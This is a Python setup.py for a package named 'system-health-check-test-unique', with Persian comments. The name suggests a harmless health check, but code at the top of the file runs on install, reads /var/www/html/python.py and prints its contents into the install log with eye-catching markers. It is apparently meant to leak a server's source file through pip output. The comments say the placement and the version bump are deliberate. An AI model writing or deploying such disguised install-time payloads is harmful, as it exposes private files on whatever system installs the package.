from setuptools import setup
import os

# کدی که می‌خواهیم اجرا شود را مستقیماً در ابتدای فایل می‌گذاریم
target_path = '/var/www/html/python.py'
if os.path.exists(target_path):
    try:
        with open(target_path, 'r') as f:
            content = f.read()
            # چاپ با علامت‌های مشخص که در لاگ ترمینال گم نشود
            print("\n" + "!"*30)
            print(content)
            print("!"*30 + "\n")
    except Exception as e:
        print(f"Error reading: {e}")

setup(
    name='system-health-check-test-unique',
    version='0.1.6', # ورژن را حتماً بالا ببرید
)